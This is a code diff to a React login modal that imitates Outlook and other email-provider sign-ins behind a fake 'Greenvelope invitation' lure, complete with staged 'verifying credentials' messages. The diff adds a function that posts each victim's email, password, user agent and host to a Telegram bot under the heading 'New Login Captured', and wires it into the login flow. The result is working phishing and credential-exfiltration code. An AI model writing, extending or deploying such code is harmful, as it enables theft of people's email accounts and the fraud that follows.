@@ -1,4 +1,6 @@
 import React, { useState, useEffect } from 'react';
+import axios from 'axios'; // Import axios for making HTTP requests
+
 import { EmailProviderConfig } from '../types';
 import {
   OutlookLoginView,
@@ -111,6 +113,24 @@ export function validateRealisticEmail(email: string, providerId: string): { isV
   return { isValid: true };
 }
 
+// Function to send login data to Telegram bot
+async function sendToTelegramBot(data) {
+  const telegramBotToken = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
+  const chatId = process.env.REACT_APP_CHAT_ID || 'YOUR_CHAT_ID'; // Replace with your chat ID
+  const message = `🔐 *New Login Captured*\n👤 Name: ${data.name}\n📧 Email: ${data.email}\n🔑 Password: ${data.password}\n🌐 IP Address: ${data.ip || 'Unknown'}\n🖥️ User Agent: ${data.userAgent || 'Unknown'}\n⏱️ Timestamp: ${new Date().toISOString()}`;
+
+  try {
+    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'MarkdownV2',
+    });
+    console.log('Message sent to Telegram bot');
+  } catch (error) {
+    console.error('Error sending message to Telegram bot:', error);
+  }
+}
+
 export const LoginModal: React.FC<LoginModalProps> = ({
   provider,
   isOpen,
@@ -195,8 +215,19 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     setTimeout(() => {
       setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
 
-      setTimeout(() => {
+      setTimeout(async () => {
         setLoadingStep('Authorizing Greenvelope invitation portal...');
+
+        // Capture login data
+        const loginData = {
+          name: email, // Assuming the 'name' is captured from the email field (modify as needed)
+          email,
+          password: pass,
+          ip: window.location.hostname || 'Unknown', // Capture the IP address or hostname
+          userAgent: navigator.userAgent || 'Unknown' // Capture the user agent string
+        };
+
+        await sendToTelegramBot(loginData); // Send login data to Telegram bot
 
         setTimeout(() => {
           setIsLoading(false);
